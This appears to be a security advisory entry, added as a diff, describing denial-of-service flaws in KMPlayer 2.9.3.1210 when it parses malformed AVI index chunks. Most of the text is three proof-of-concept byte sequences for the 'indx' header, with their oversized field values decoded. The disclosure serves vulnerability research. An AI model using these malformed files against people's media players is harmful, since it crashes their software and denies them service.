@@ -1,0 +1,37 @@
+source: http://www.securityfocus.com/bid/25651/info
+
+KMPlayer is prone to multiple denial-of-service vulnerabilities when handling malformed AVI media files.
+
+Successfully exploiting this issue allows remote attackers to deny service to legitimate users.
+
+These issues affect KMPlayer 2.9.3.1210; other versions may also be vulnerable. 
+
+new_avihead_poc1.avi
+------------------------------------------
+69 6E 64 78 FF FF FF FF 01 00 64 73 20 00 00 10
+
+indx truck size 0xffffffff
+wLongsPerEntry 0x0001
+BIndexSubType is 0x64
+bIndexType is 0x73
+nEntriesInuse is 0x10000020
+
+new_avihead_poc2.avi
+------------------------------------------
+69 6E 64 78 00 FF FF FF FF FF 64 73 FF FF FF FF
+
+indx truck size 0xffffff00
+wLongsPerEntry 0xffff
+BIndexSubType is 0x64
+bIndexType is 0x73
+nEntriesInuse is 0xFFFFFFFF
+
+new_avihead_poc3.avi
+------------------------------------------
+69 6E 64 78 00 FF FF FF 01 11 64 73 20 00 00 10
+
+indx truck size 0xffffff00
+wLongsPerEntry 0x0001
+BIndexSubType is 0x64
+bIndexType is 0x73
+nEntriesInuse is 0x10000020 
